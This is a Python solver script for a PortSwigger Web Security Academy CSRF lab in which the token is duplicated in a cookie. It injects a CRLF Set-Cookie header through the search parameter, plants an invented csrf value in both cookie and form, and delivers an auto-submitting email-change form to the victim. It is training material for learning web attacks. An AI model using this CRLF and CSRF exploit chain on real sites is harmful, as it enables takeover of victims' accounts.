#!/usr/bin/env python3
"""
CSRF where token is duplicated in cookie
PortSwigger Web Security Academy -- Cross-Site Request Forgery (CSRF)

Companion script for the writeup: 06-token-duplicated-in-cookie.md

What this does:
    Logs in and runs the same detect_cookie_injection() CRLF probe against
    /?search= as the previous lab, confirming the same cookie-setting gadget
    is present. Because double-submit validation only checks that the csrf
    cookie equals the csrf parameter -- never that either value was actually
    issued by the server -- this invents an arbitrary string
    (FakeTokenInventedByAttacker123, matching lab_token_duplicated_cookie()'s
    invented value in CSRF.py) and injects it as both the cookie (via CRLF)
    and the form parameter, so the two sides of the check always agree.

Usage:
    python 06-token-duplicated-in-cookie.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import time
import urllib.parse
import httpx


def _get_csrf(client: httpx.Client, path: str = "/login") -> str:
    r = client.get(path)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if m:
        return m.group(1)
    m = re.search(r'name=csrf\s+value=([^\s>]+)', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, username: str = "wiener", password: str = "peter") -> bool:
    csrf = _get_csrf(client, "/login")
    r = client.post("/login", data={"csrf": csrf, "username": username, "password": password})
    return r.status_code < 400 and "Log out" in r.text


def _get_exploit_server_url(client: httpx.Client) -> str:
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else ""


def detect_cookie_injection(client: httpx.Client, base_url: str) -> str:
    """Probe /?search= for CRLF header injection; return a {COOKIE_NAME}/{COOKIE_VALUE} URL template."""
    test_cookie = "csrfTestCookie"
    test_value = "testValue123"
    crlf_url = (
        f"{base_url}/?search=x%0d%0aSet-Cookie:%20{test_cookie}={test_value}"
        "%3b%20SameSite=None"
    )
    r = client.get(crlf_url)
    for header_val in r.headers.get_list("set-cookie"):
        if test_cookie in header_val:
            return (
                f"{base_url}/?search=x%0d%0aSet-Cookie:%20"
                "{COOKIE_NAME}={COOKIE_VALUE}%3b%20SameSite=None"
            )
    return ""


def _exploit_server_deliver(exploit_url: str, body: str, headers: str) -> bool:
    with httpx.Client(follow_redirects=True, timeout=20) as c:
        r = c.post(exploit_url, data={
            "responseFile": "/exploit",
            "responseBody": body,
            "responseHead": headers,
            "formAction": "DELIVER_TO_VICTIM",
        })
    return r.status_code < 400


def solve(lab_url: str) -> None:
    client = httpx.Client(
        base_url=lab_url, follow_redirects=True, timeout=20,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    )
    client.get("/")

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] No exploit server found.")
        return

    if not _login(client):
        print("[-] Login as wiener:peter failed.")
        return

    injection_url = detect_cookie_injection(client, lab_url)
    print(f"[*] Cookie injection gadget: {'FOUND' if injection_url else 'NOT FOUND'}")
    if not injection_url:
        print("[-] No CRLF cookie-injection gadget found on /?search= for this instance.")
        return

    fake_csrf = "FakeTokenInventedByAttacker123"
    endpoint = f"{lab_url}/my-account/change-email"
    inject_url = injection_url.format(
        COOKIE_NAME="csrf",
        COOKIE_VALUE=urllib.parse.quote(fake_csrf, safe=""),
    )

    html = (
        '<html><body>\n'
        f'<form action="{endpoint}" method="POST">\n'
        f'  <input type="hidden" name="csrf" value="{fake_csrf}" />\n'
        '  <input type="hidden" name="email" value="hacker@evil-user.net" />\n'
        '</form>\n'
        f'<img src="{inject_url}" onerror="document.forms[0].submit()">\n'
        '</body></html>'
    )
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    print(f"[*] Technique: Cookie injection (csrf={fake_csrf[:8]}...) via CRLF + matching token")

    _exploit_server_deliver(exploit_url, html, headers)
    time.sleep(5)

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved -- the invented cookie/param pair passed the double-submit check.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
